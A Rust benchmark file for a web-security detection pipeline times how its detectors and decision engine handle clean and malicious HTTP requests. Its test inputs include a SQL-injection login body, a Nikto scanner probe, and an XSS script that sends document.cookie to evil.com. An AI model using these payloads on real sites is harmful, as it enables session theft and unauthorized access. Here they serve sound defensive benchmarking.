//! Benchmarks end-to-end du pipeline complet
//!
//! Mesure la latence totale du flux : contexte → détecteurs → decision engine → résultat.
//! Compare les scénarios clean, suspect et malveillant.

use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion};
use std::net::IpAddr;
use std::str::FromStr;
use std::sync::Arc;
use websec::detectors::{
    BotDetector, BruteForceDetector, Detector, DetectorRegistry, FloodDetector, GeoDetector,
    HeaderDetector, HttpRequestContext, InjectionDetector, ProtocolDetector, ScanDetector,
    SessionDetector,
};
use websec::reputation::decision::{DecisionEngine, DecisionEngineConfig};
use websec::storage::InMemoryRepository;

fn create_full_registry() -> Arc<DetectorRegistry> {
    let mut registry = DetectorRegistry::new();
    registry.register(Arc::new(BotDetector::new()));
    registry.register(Arc::new(BruteForceDetector::new()));
    registry.register(Arc::new(FloodDetector::new()));
    registry.register(Arc::new(InjectionDetector::new()));
    registry.register(Arc::new(ScanDetector::new()));
    registry.register(Arc::new(HeaderDetector::new()));
    registry.register(Arc::new(GeoDetector::new()));
    registry.register(Arc::new(ProtocolDetector::new()));
    registry.register(Arc::new(SessionDetector::new()));
    Arc::new(registry)
}

fn clean_request(ip: &str) -> HttpRequestContext {
    HttpRequestContext {
        ip: IpAddr::from_str(ip).unwrap(),
        method: "GET".to_string(),
        path: "/index.html".to_string(),
        query: None,
        headers: vec![
            ("Host".to_string(), "example.com".to_string()),
            (
                "User-Agent".to_string(),
                "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
                    .to_string(),
            ),
            ("Accept".to_string(), "text/html".to_string()),
            (
                "Accept-Language".to_string(),
                "fr-FR,fr;q=0.9".to_string(),
            ),
        ],
        body: None,
        user_agent: Some(
            "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0".to_string(),
        ),
        referer: Some("https://example.com/".to_string()),
        content_type: None,
    }
}

fn sqli_request() -> HttpRequestContext {
    HttpRequestContext {
        ip: IpAddr::from_str("10.0.0.1").unwrap(),
        method: "POST".to_string(),
        path: "/login".to_string(),
        query: Some("user=admin'--".to_string()),
        headers: vec![
            ("Host".to_string(), "example.com".to_string()),
            (
                "User-Agent".to_string(),
                "Mozilla/5.0 (compatible)".to_string(),
            ),
            (
                "Content-Type".to_string(),
                "application/x-www-form-urlencoded".to_string(),
            ),
        ],
        body: Some(b"username=admin' OR '1'='1&password=test".to_vec()),
        user_agent: Some("Mozilla/5.0 (compatible)".to_string()),
        referer: None,
        content_type: Some("application/x-www-form-urlencoded".to_string()),
    }
}

fn scanner_request() -> HttpRequestContext {
    HttpRequestContext {
        ip: IpAddr::from_str("10.0.0.2").unwrap(),
        method: "GET".to_string(),
        path: "/wp-admin/install.php".to_string(),
        query: None,
        headers: vec![
            ("Host".to_string(), "example.com".to_string()),
            ("User-Agent".to_string(), "Nikto/2.1.6".to_string()),
        ],
        body: None,
        user_agent: Some("Nikto/2.1.6".to_string()),
        referer: None,
        content_type: None,
    }
}

fn xss_request() -> HttpRequestContext {
    HttpRequestContext {
        ip: IpAddr::from_str("10.0.0.3").unwrap(),
        method: "POST".to_string(),
        path: "/comment".to_string(),
        query: None,
        headers: vec![
            ("Host".to_string(), "example.com".to_string()),
            ("User-Agent".to_string(), "curl/8.0".to_string()),
            (
                "Content-Type".to_string(),
                "application/json".to_string(),
            ),
        ],
        body: Some(
            br#"{"body":"<script>document.location='https://evil.com/steal?c='+document.cookie</script>"}"#
                .to_vec(),
        ),
        user_agent: Some("curl/8.0".to_string()),
        referer: None,
        content_type: Some("application/json".to_string()),
    }
}

fn bench_full_pipeline(c: &mut Criterion) {
    let mut group = c.benchmark_group("full_pipeline");

    let registry = create_full_registry();
    let config = DecisionEngineConfig::default();
    let repository = Arc::new(InMemoryRepository::new());
    let engine = DecisionEngine::new(config, repository, registry);

    // Clean request — should ALLOW
    let ctx_clean = clean_request("192.168.1.100");
    group.bench_function("clean_request", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(engine.process_request(black_box(&ctx_clean)).await.unwrap())
            });
    });

    // SQL injection — should flag
    let ctx_sqli = sqli_request();
    group.bench_function("sqli_attack", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(engine.process_request(black_box(&ctx_sqli)).await.unwrap())
            });
    });

    // Vulnerability scanner — should flag
    let ctx_scan = scanner_request();
    group.bench_function("scanner_attack", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(engine.process_request(black_box(&ctx_scan)).await.unwrap())
            });
    });

    // XSS attack — should flag
    let ctx_xss = xss_request();
    group.bench_function("xss_attack", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(engine.process_request(black_box(&ctx_xss)).await.unwrap())
            });
    });

    group.finish();
}

fn bench_pipeline_throughput(c: &mut Criterion) {
    let mut group = c.benchmark_group("pipeline_throughput");
    group.sample_size(50);

    let registry = create_full_registry();
    let config = DecisionEngineConfig::default();
    let repository = Arc::new(InMemoryRepository::new());
    let engine = Arc::new(DecisionEngine::new(config, repository, registry));

    for concurrent in [1, 10, 50, 100, 500] {
        group.bench_with_input(
            BenchmarkId::new("concurrent_requests", concurrent),
            &concurrent,
            |b, &n| {
                b.to_async(tokio::runtime::Runtime::new().unwrap())
                    .iter(|| async {
                        let mut handles = Vec::with_capacity(n);
                        for i in 0..n {
                            let engine = engine.clone();
                            let ctx = clean_request(&format!("10.{}.{}.{}", i / 65536 % 256, i / 256 % 256, i % 256));
                            handles.push(tokio::spawn(async move {
                                engine.process_request(&ctx).await.unwrap()
                            }));
                        }
                        for handle in handles {
                            black_box(handle.await.unwrap());
                        }
                    });
            },
        );
    }

    group.finish();
}

fn bench_individual_remaining_detectors(c: &mut Criterion) {
    let mut group = c.benchmark_group("detector_individual");

    let normal_ctx = clean_request("192.168.1.1");
    let malicious_ctx = scanner_request();

    // Protocol Detector
    let protocol_detector = ProtocolDetector::new();
    group.bench_function("protocol/normal", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(protocol_detector.analyze(black_box(&normal_ctx)).await)
            });
    });
    group.bench_function("protocol/malicious", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(protocol_detector.analyze(black_box(&malicious_ctx)).await)
            });
    });

    // Session Detector
    let session_detector = SessionDetector::new();
    group.bench_function("session/normal", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(session_detector.analyze(black_box(&normal_ctx)).await)
            });
    });

    // Flood Detector
    let flood_detector = FloodDetector::new();
    group.bench_function("flood/normal", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(flood_detector.analyze(black_box(&normal_ctx)).await)
            });
    });

    // BruteForce Detector
    let bruteforce_detector = BruteForceDetector::new();
    group.bench_function("bruteforce/normal", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(bruteforce_detector.analyze(black_box(&normal_ctx)).await)
            });
    });

    // Geo Detector
    let geo_detector = GeoDetector::new();
    group.bench_function("geo/normal", |b| {
        b.to_async(tokio::runtime::Runtime::new().unwrap())
            .iter(|| async {
                black_box(geo_detector.analyze(black_box(&normal_ctx)).await)
            });
    });

    group.finish();
}

criterion_group!(
    benches,
    bench_full_pipeline,
    bench_pipeline_throughput,
    bench_individual_remaining_detectors,
);
criterion_main!(benches);
